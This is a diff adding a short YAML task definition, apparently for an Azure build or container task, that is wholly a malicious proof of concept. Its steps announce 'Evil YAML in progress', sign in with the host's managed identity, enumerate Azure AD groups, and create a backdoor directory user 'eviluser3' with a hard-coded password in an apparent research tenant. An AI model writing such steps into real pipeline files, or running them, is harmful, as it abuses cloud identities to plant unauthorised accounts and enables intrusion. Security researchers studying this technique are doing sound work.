@@ -1,0 +1,6 @@
+version: v1.1.0
+steps:
+  - cmd: bash echo Evil YAML in progress
+  - cmd: az login --allow-no-subscriptions --identity
+  - cmd: az ad group list
+  - cmd: az ad user create --display-name eviluser3 --password p@ssword!123 --user-principal-name eviluser3@ciscoswcresearch.onmicrosoft.com
